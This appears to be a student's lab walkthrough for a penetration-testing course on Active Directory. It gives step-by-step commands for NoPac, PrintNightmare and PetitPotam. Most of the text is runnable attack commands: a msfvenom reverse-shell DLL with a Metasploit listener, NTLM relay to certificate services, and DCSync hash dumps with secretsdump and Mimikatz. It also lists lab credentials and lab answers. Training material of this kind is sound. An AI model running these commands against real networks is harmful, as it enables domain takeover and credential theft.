# Section 25 — Bleeding Edge Vulnerabilities

> Three attacks: NoPac (SamAccountName Spoofing), PrintNightmare, PetitPotam
> All performed from Linux attack host (ATTACK01 — SSH to 10.129.94.209)

---

## QUICK REFERENCE

```bash
# NoPac — scan then shell
sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# NoPac — DCSync directly
sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

# PrintNightmare — check if vulnerable
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# PetitPotam — two windows needed
# Window 1:
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
# Window 2:
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# PetitPotam — after getting base64 cert
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_BLOB> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
> Quick reference for all three attacks. Run scanner.py first before noPac.py to confirm the environment is vulnerable. For PetitPotam, run ntlmrelayx in one terminal and PetitPotam in another — order matters. Replace IP addresses and domain names for your target.

---

## Attack 1 — NoPac (SamAccountName Spoofing)

**Common Vulnerabilities and Exposures (CVEs):** `2021-42278` (Security Account Manager bypass) + `2021-42287` (Kerberos Privilege Attribute Certificate)  
**Requirement:** Any standard domain user + ms-DS-MachineAccountQuota ≥ 1 (default = 10)  
**Result:** SYSTEM shell or DCSync from a standard domain user in one command

**How it works:**
1. Create a new computer account. Any authenticated user can add up to 10 by default.
2. Rename it to match a Domain Controller's SamAccountName (e.g. `ACADEMY-EA-DC01`).
3. Request a Ticket Granting Ticket (TGT). The Key Distribution Center (KDC) issues it thinking you are the DC.
4. Rename the computer back, then request a Ticket Granting Service (TGS) ticket. The service issues it under the DC's identity.
5. Use the DC ticket to get a SYSTEM shell or run DCSync.

### Step 1 — SSH into the attack host

```bash
ssh htb-student@10.129.94.209
# password: HTB_@cademy_stdnt!
```
> Connects to the Linux attack host where all three tools are installed. Replace the IP with the address of your attack host.
- All three attacks in this section are run from the Linux attack host ATTACK01
- The DC (172.16.5.5) and internal network are only reachable from this host

### Step 2 — Scan to confirm vulnerability

```bash
sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
> Checks whether the DC is vulnerable to NoPac. Uses standard domain user credentials. "Got TGT with PAC" in the output means the attack will work. If `ms-DS-MachineAccountQuota = 0`, the attack is blocked.
- Uses forend's creds (standard domain user) to attempt to get a TGT from the DC
- Checks `ms-DS-MachineAccountQuota` — must be ≥ 1 for the attack to work
- "Got TGT with PAC" = vulnerable. "Ticket size 663" = got DC-level ticket = exploit works
- If MachineAccountQuota = 0, the attack fails — standard users can't add computer accounts

**Output confirms:**
```
[*] Current ms-DS-MachineAccountQuota = 10    ← attack will work
[*] Got TGT with PAC from 172.16.5.5          ← DC issued us a ticket
[*] Got TGT from ACADEMY-EA-DC01              ← confirmed vulnerable
```

### Step 3 — Get SYSTEM shell on DC

```bash
sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -dc-ip 172.16.5.5 \
  -dc-host ACADEMY-EA-DC01 \
  -shell \
  --impersonate administrator \
  -use-ldap
```
> Exploits NoPac to get a SYSTEM shell on the DC. `-shell` drops into an smbexec shell — use full absolute paths in that shell, `cd` does not work. `--impersonate administrator` spoofs the built-in domain admin. Saves a `.ccache` ticket to disk for reuse.
- `forend:Klmcargo2` = standard domain user creds — no elevated rights needed
- `-dc-ip 172.16.5.5` = IP of the Domain Controller to target
- `-dc-host ACADEMY-EA-DC01` = hostname of the DC — must match the -dc-ip host
- `-shell` = drop into an interactive smbexec shell on the DC
- `--impersonate administrator` = spoof the built-in domain administrator account
- `-use-ldap` = use LDAP to create/modify computer accounts instead of Kerberos
- Tool auto-creates a temp computer account, renames it to DC name, gets ticket, renames back
- Saved tickets: `administrator.ccache` in the current directory — usable for PtT later

### Step 4 — Read the flag (full path — no cd in smbexec)

```cmd
type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
```
> Reads a file using a full absolute path. The smbexec shell executes each command as a fresh batch file — directory state does not persist between commands. Always use full paths.
- smbexec shells execute each command by writing a batch file over SMB — no persistent directory state
- `cd` does not work — always use full absolute paths for every command
- `type` = Windows equivalent of `cat`
- Result: `D0ntSl@ckonN0P@c!`

### Alternative — DCSync directly (no shell)

```bash
sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -dc-ip 172.16.5.5 \
  -dc-host ACADEMY-EA-DC01 \
  --impersonate administrator \
  -use-ldap \
  -dump \
  -just-dc-user INLANEFREIGHT/administrator
```
> Skips the interactive shell and dumps the administrator hash directly. `-dump` runs secretsdump internally. `-just-dc-user` limits output to one account — faster and less noisy than a full dump.
- `-dump` = run secretsdump instead of opening a shell
- `-just-dc-user` = only dump hashes for one user — faster and less noisy
- Outputs administrator NTLM hash + Kerberos keys directly
- Still saves a `.ccache` ticket to disk — clean up after

---

## Attack 2 — PrintNightmare (CVE-2021-34527 / CVE-2021-1675)

**Requirement:** Any domain user credentials + Print Spooler service running on target  
**Result:** SYSTEM shell via DLL injection through Print Spooler  
**Risk:** Can crash the Print Spooler service — notify client, use carefully

### Step 1 — Check if Print Spooler is exposed

```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
# MS-RPRN = Print System Remote Protocol
# MS-PAR  = Print System Asynchronous Remote Protocol
# Both present = likely vulnerable
```
> Enumerates Remote Procedure Call (RPC) endpoints on the target and filters for Print Spooler protocols. If either `MS-RPRN` or `MS-PAR` appears, the Print Spooler is running and the host may be vulnerable. Replace the IP for your target.
- `rpcdump.py` enumerates RPC endpoints exposed on the target
- MS-RPRN/MS-PAR present = Print Spooler is running and accessible remotely

### Step 2 — Generate DLL payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
> Creates a malicious DLL that connects back to your listener when loaded. Replace `LHOST` with your attack host IP and `LPORT` with any open port. The `-f dll` flag outputs in Windows DLL format.
- Creates a malicious DLL that calls back to our listener when executed
- The DC will load this DLL via the Print Spooler service as SYSTEM

### Step 3 — Host DLL on SMB share

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
> Hosts a temporary SMB share so the target can pull the DLL. `-smb2support` is required for modern Windows hosts that have SMBv1 disabled. Replace the path with the directory containing your DLL.
- Creates an SMB share the target DC can reach to pull down the DLL
- `-smb2support` = required for modern Windows targets (SMBv1 disabled)

### Step 4 — Start MSF listener (new window)

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```
> Sets up a Metasploit listener to catch the reverse shell. LHOST and LPORT must match what you set in msfvenom. Start this before triggering the exploit so the callback is not missed.
- Catches the reverse shell callback when the DC loads our DLL

### Step 5 — Trigger exploit

```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
> Sends the exploit to the DC's Print Spooler service using forend's domain credentials. The DC will load the DLL from the SMB share and execute it as SYSTEM. Your Metasploit listener should receive a callback.
- Connects to Print Spooler RPC on the DC using forend's creds
- Forces the DC to load our DLL from the SMB share
- DLL executes as SYSTEM → reverse shell connects to MSF listener

---

## Attack 3 — PetitPotam (CVE-2021-36942)

**Requirement:** No authentication needed + Active Directory Certificate Services (AD CS) with Web Enrollment running  
**Result:** Coerce DC to authenticate → relay to Certificate Authority (CA) → get DC certificate → TGT → DCSync  

**How it works:**
1. `ntlmrelayx` listens for incoming New Technology LAN Manager (NTLM) auth and relays it to the CA's web enrollment page.
2. PetitPotam coerces the DC to authenticate to your host using the MS-EFSRPC protocol.
3. `ntlmrelayx` relays that auth to AD CS. The CA issues a certificate for the DC machine account.
4. Use the certificate with `gettgtpkinit.py` to request a TGT for the DC machine account.
5. Use the TGT with `secretsdump.py` to run DCSync and achieve full domain compromise.

### Step 1 — Start ntlmrelayx (Window 1)

```bash
sudo ntlmrelayx.py -debug -smb2support \
  --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController
```
> Starts an NTLM relay listener that forwards captured authentication to the AD Certificate Services (AD CS) web enrollment page. `--adcs` requests a certificate instead of just capturing credentials. `--template DomainController` issues a cert that allows DC impersonation.
- `--target` = the CA's web enrollment URL — this is where we relay the DC's credentials
- `--adcs` = tells ntlmrelayx to request a certificate (not just capture/relay creds)
- `--template DomainController` = request a cert using the DomainController template (allows DC impersonation)
- Waits for an incoming connection from the DC

### Step 2 — Coerce DC authentication (Window 2)

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
# 172.16.5.225 = our attack host (ntlmrelayx listener)
# 172.16.5.5   = DC to coerce
```
> Forces the DC to authenticate to your attack host using MS-EFSRPC. The first IP is where ntlmrelayx is listening. The second IP is the DC to coerce. ntlmrelayx catches the connection and relays it to AD CS.
- Calls MS-EFSRPC methods on the DC that force it to authenticate back to us
- Look for: "Attack worked!" — DC sent its NTLM auth to our listener
- ntlmrelayx catches it and relays to AD CS → outputs a base64 certificate blob

### Step 3 — Request TGT using the certificate

```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ \
  -pfx-base64 <BASE64_BLOB_FROM_NTLMRELAYX> dc01.ccache
# Save the AS-REP encryption key from output — needed for getnthash.py
```
> Uses the certificate from ntlmrelayx to get a Kerberos TGT for the DC machine account. Paste the base64 blob from ntlmrelayx output. The ticket is saved to `dc01.ccache`. Save the AS-REP key printed in the output.
- Uses PKINIT (certificate-based Kerberos auth) to get a TGT for the DC machine account
- The TGT is saved to `dc01.ccache`
- The AS-REP encryption key in the output is needed if you want to use getnthash.py later

### Step 4 — Set ticket and DCSync

```bash
export KRB5CCNAME=dc01.ccache
# Tells all Kerberos tools to use this ticket file for authentication

secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
  -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# -k = use Kerberos (reads KRB5CCNAME)
# -no-pass = no password needed, using ticket
```
> Sets the active Kerberos ticket file and uses it to run DCSync. `export KRB5CCNAME` must be set before any `-k -no-pass` command. `-k` tells secretsdump to use Kerberos instead of password authentication.
- We now have a TGT for the DC machine account, which has replication rights
- secretsdump uses that TGT to perform DCSync → dumps administrator hash

### Alternative — Get DC NTLM hash directly

```bash
python3 /opt/PKINITtools/getnthash.py \
  -key <AS-REP_ENCRYPTION_KEY> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
# Uses Kerberos U2U to request a TGS with PAC containing the NT hash
# Decrypts it with the AS-REP key → returns the DC machine account NT hash

secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
  "ACADEMY-EA-DC01$"@172.16.5.5 \
  -hashes aad3c435b514a4eeaad3b935b51304fe:<DC_NT_HASH>
```
> Gets the DC machine account's NTLM hash from the certificate TGT, then uses it to run DCSync. Paste the AS-REP key saved from gettgtpkinit.py. The `aad3c435b...` prefix is the blank LM hash — leave it as-is.

### Confirm admin access

```bash
nxc smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
# [+] INLANEFREIGHT.LOCAL\administrator (Pwn3d!)
```
> Confirms the dumped administrator hash works by testing SMB auth. "Pwn3d!" means local admin or domain admin access is confirmed on that host.

### Windows alternative — Rubeus PTT

```powershell
# On MS01 with base64 cert from ntlmrelayx:
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<BASE64_BLOB> /ptt
# /ptt = pass-the-ticket, injects TGT directly into memory
# Then DCSync with Mimikatz using the injected ticket:
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt
```
> Windows path for PetitPotam. Uses Rubeus to request a TGT from the certificate and inject it into memory with `/ptt`. Then runs Mimikatz DCSync using the injected ticket — no password needed.

---

## Comparison Table

| Attack | CVEs | Auth Needed | Requires | Result |
|--------|------|-------------|----------|--------|
| NoPac | 2021-42278, 2021-42287 | Domain user | MachineAccountQuota ≥ 1 | SYSTEM shell / DCSync |
| PrintNightmare | 2021-34527, 2021-1675 | Domain user | Print Spooler running | SYSTEM shell |
| PetitPotam | 2021-36942 | None | AD CS + Web Enrollment | DC cert → TGT → DCSync |

---

## Important Notes

- **smbexec shells:** Cannot use `cd` — every command needs a full absolute path
- **NoPac cleanup:** Tool tries to delete the temp computer account but may fail — check AD afterward
- **PrintNightmare:** Can crash Print Spooler — coordinate with client before running
- **PetitPotam patch:** Only patches unauthenticated coercion — authenticated users can still coerce → AD CS attacks still possible with domain user creds
- **`export KRB5CCNAME=file.ccache`** = must set this before any `-k -no-pass` secretsdump command

---

## Lab Answers

| Question | Answer |
|----------|--------|
| Two CVEs for NoPac | `2021-42278&2021-42287` |
| Flag at C:\Users\Administrator\Desktop\DailyTasks\flag.txt | `D0ntSl@ckonN0P@c!` |

---

## Exam Notes

- NoPac = single command from standard domain user → SYSTEM on DC — check for it early
- Always run scanner.py first — confirms MachineAccountQuota and vulnerability before making noise
- smbexec shells = full paths only, no `cd`, no Linux commands (`cat`, `ls`, `sudo` don't work)
- PetitPotam requires AD CS with certsrv web enrollment — check for it at the start of an engagement
- `export KRB5CCNAME=dc01.ccache` = set before every `-k -no-pass` Kerberos command
- PKINITtools path on ATTACK01: `/opt/PKINITtools/`
- noPac path on ATTACK01: `/opt/noPac/`
- Saved ccache tickets = reusable for PtT attacks — don't forget to clean up
